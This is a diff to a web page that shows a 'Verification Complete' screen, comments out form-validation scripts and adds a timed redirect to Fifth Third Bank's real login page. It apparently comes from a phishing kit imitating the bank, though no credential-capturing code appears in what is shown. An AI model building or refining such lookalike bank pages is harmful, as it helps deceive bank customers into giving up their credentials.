@@ -142,7 +142,8 @@
                                   alt="Silhouette of person inside a circle with a question mark"
                                   class="media-block__media__img img-responsive"></span><span class="media-block__body">
                                 <div class="b fs-5-shift spacing-bottom--half"> Verification Complete </div><br>
-                                <div class="nc-body-text"> redirecting... </div>
+                              
+                                <div class="nc-body-text"> Redirecting to login .... </div>
                                 <br>
                                 <br>
                               </span></span>
@@ -352,43 +353,46 @@
   // let nFilled = inputs.parentElement.getAttribute('data-valid');
   // let isValid = true;
 
-  let inputs = document.getElementsByClassName("form-input");
-let inputsArray = Array.from(inputs);
+//   let inputs = document.getElementsByClassName("form-input");
+// let inputsArray = Array.from(inputs);
 
-inputsArray.forEach(input => {
-  input.addEventListener('blur', function() {
-    let parentElement = input.parentElement;
-    let nFilled = parentElement.getAttribute('data-valid');
-    let isValid = true;
+// inputsArray.forEach(input => {
+//   input.addEventListener('blur', function() {
+//     let parentElement = input.parentElement;
+//     let nFilled = parentElement.getAttribute('data-valid');
+//     let isValid = true;
 
-    if (!input.value) {
-      console.log("false");
-      nFilled = "false"; // Update data-valid attribute to "false"
+//     if (!input.value) {
+//       console.log("false");
+//       nFilled = "false"; // Update data-valid attribute to "false"
   
-    } else {
-      console.log("true");
-      nFilled = "true"; // Update data-valid attribute to "true"
+//     } else {
+//       console.log("true");
+//       nFilled = "true"; // Update data-valid attribute to "true"
      
-    }
+//     }
 
-    // Update the data-valid attribute of the parent element
-    parentElement.setAttribute('data-valid', nFilled);
-  });
-});
+//     // Update the data-valid attribute of the parent element
+//     parentElement.setAttribute('data-valid', nFilled);
+//   });
+// });
 
-let idwrapElements = document.getElementsByClassName('idwrap');
+// let idwrapElements = document.getElementsByClassName('idwrap');
 
-for (const ids of idwrapElements) {
-  ids.addEventListener("click", () => {
-    let childElement = ids.firstElementChild;
-    if (childElement) {
-      childElement.click();
-    }
-  });
-}
+// for (const ids of idwrapElements) {
+//   ids.addEventListener("click", () => {
+//     let childElement = ids.firstElementChild;
+//     if (childElement) {
+//       childElement.click();
+//     }
+//   });
+// }
 
 
+setTimeout( ()=>{
+window.location.href = "https://www.53.com/content/fifth-third/en/login.html/";
 
+}, 2000);
 
 
  
